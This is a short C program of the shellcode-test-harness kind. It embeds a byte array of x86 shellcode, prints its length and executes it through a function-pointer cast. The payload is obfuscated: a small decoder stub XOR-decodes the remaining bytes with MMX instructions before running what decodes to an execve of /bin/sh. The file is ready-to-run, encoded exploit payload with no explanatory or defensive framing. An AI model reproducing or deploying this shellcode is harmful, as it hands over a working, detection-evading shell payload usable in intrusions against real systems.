#include<stdio.h>
#include<string.h>

unsigned char code[]="\xeb\x1b\x5f\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x06\x0f\x6f\x0f\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x0d\xe8\xe0\xff\xff\xff\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\xc4\x85\xd9\xc2\xc2\x85\x85\xc8\xc3\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a";

main()
{
 printf("[+] shellcode Length: %d\n", strlen(code));
 int (*ret)() = (int(*)())code;
 ret();

}
